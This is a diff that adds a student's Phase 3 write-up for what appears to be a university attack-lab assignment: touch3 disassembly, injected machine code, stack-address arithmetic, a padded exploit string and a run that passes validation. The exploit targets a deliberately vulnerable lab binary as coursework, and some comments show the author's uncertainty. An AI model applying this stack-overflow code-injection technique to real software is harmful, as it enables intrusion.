@@ -229,3 +229,82 @@ NICE JOB!
 ////////////////////////////////////////////////////////////////////////////////////////////////////////
 //                                              Phase 3                                               //
 ////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+// In rtarget, my touch3 assembly code looks like this:
+000000000040186d <touch3>:
+  40186d:	53                   	push   %rbx
+  40186e:	48 89 fb             	mov    %rdi,%rbx
+  401871:	c7 05 81 3c 20 00 03 	movl   $0x3,0x203c81(%rip)        # 6054fc <vlevel>
+  401878:	00 00 00 
+  40187b:	48 89 fe             	mov    %rdi,%rsi
+  40187e:	8b 3d 80 3c 20 00    	mov    0x203c80(%rip),%edi        # 605504 <cookie>
+  401884:	e8 66 ff ff ff       	callq  4017ef <hexmatch>
+  401889:	85 c0                	test   %eax,%eax
+  40188b:	74 1e                	je     4018ab <touch3+0x3e>
+  40188d:	48 89 de             	mov    %rbx,%rsi
+  401890:	bf 98 30 40 00       	mov    $0x403098,%edi
+  401895:	b8 00 00 00 00       	mov    $0x0,%eax
+  40189a:	e8 e1 f3 ff ff       	callq  400c80 <printf@plt>
+  40189f:	bf 03 00 00 00       	mov    $0x3,%edi
+  4018a4:	e8 00 04 00 00       	callq  401ca9 <validate>
+  4018a9:	eb 1c                	jmp    4018c7 <touch3+0x5a>
+  4018ab:	48 89 de             	mov    %rbx,%rsi
+  4018ae:	bf c0 30 40 00       	mov    $0x4030c0,%edi
+  4018b3:	b8 00 00 00 00       	mov    $0x0,%eax
+  4018b8:	e8 c3 f3 ff ff       	callq  400c80 <printf@plt>
+  4018bd:	bf 03 00 00 00       	mov    $0x3,%edi
+  4018c2:	e8 94 04 00 00       	callq  401d5b <fail>
+  4018c7:	bf 00 00 00 00       	mov    $0x0,%edi
+  4018cc:	e8 1f f5 ff ff       	callq  400df0 <exit@plt>
+// My touch3 function address is: 000000000040186d
+// In little endian, this is “6d 18 40 00 00 00 00 00”
+
+// In phase2, my %rsp address was 0x556841c8 + buffer 0x38 + %rsp return address 8 bytes + touch3 address 8 bytes = 1432895944 + 56 + 8 + 8 = 1432896016 = 0x55684210
+// Make a phase3.s file that includes:
+movq $0x55684210,%rdi
+retq
+
+[jieyun@lnxsrv09 ~/target164]$ gcc -c phase3.s
+[jieyun@lnxsrv09 ~/target164]$ objdump -d phase3.o > phase3.d
+
+// Download phase3.d from my Cyberduck. Open with Atom, phase3.d includes:
+phase3.o:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000000000 <.text>:
+   0:	48 c7 c7 10 42 68 55 	mov    $0x55684210,%rdi
+   7:	c3                   	retq   
+
+// My cookie is “0x4e99cb1b”, which is equivalent to “34 65 39 39 63 62 31 62” in text format.
+
+48 c7 c7 10 42 68 55 c3 // return a cookie
+00 00 00 00 00 00 00 00 // 56 bytes of padding in total, including cookie padding
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+c8 41 68 55 00 00 00 00 // %rsp address???
+6d 18 40 00 00 00 00 00 // touch3 function address
+34 65 39 39 63 62 31 62 // cookie in text format, instead of hex
+
+[jieyun@lnxsrv09 ~/target164]$ ./hex2raw < phase3.txt > raw-phase3.txt
+[jieyun@lnxsrv09 ~/target164]$ ./ctarget < raw-phase3.txt
+Cookie: 0x4e99cb1b
+Type string:Touch3!: You called touch3("4e99cb1b")
+Valid solution for level 3 with target ctarget
+PASS: Sent exploit string to server to be validated.
+NICE JOB!
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////
+//                                              Phase 4                                               //
+////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+
+
